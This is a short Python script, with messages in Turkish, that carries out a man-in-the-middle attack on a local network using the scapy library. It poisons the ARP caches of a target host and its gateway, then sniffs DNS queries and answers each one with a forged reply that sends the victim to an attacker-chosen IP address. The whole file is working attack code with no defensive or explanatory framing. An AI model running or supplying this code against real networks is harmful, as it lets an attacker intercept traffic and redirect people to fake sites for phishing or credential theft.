from scapy.all import *
import threading
import time

spoofed_ip = "192.168.1.100"

def get_mac(ip):
    ans, _ = arping(ip, timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv[ARP].hwsrc
    return None

def arp_spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if not target_mac or not gateway_mac:
        print("MAC adresleri alınamadı.")
        return

    while True:
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
        time.sleep(2)

def dns_spoof(packet):
    if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
        spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                      UDP(dport=packet[UDP].sport, sport=53) / \
                      DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                          an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=spoofed_ip))
        send(spoofed_pkt, verbose=False)
        print(f"[+] {packet[DNSQR].qname.decode()} sahte IP ile yönlendirildi.")

def start_mitm(target_ip, gateway_ip):
    threading.Thread(target=arp_spoof, args=(target_ip, gateway_ip)).start()
    print("[*] DNS Spoofing başlatılıyor...")
    sniff(filter="udp port 53", prn=dns_spoof)

if __name__ == "__main__":
    print("[*] MITM saldırısı başlatılıyor...")
    start_mitm("192.168.1.10", "192.168.1.1")
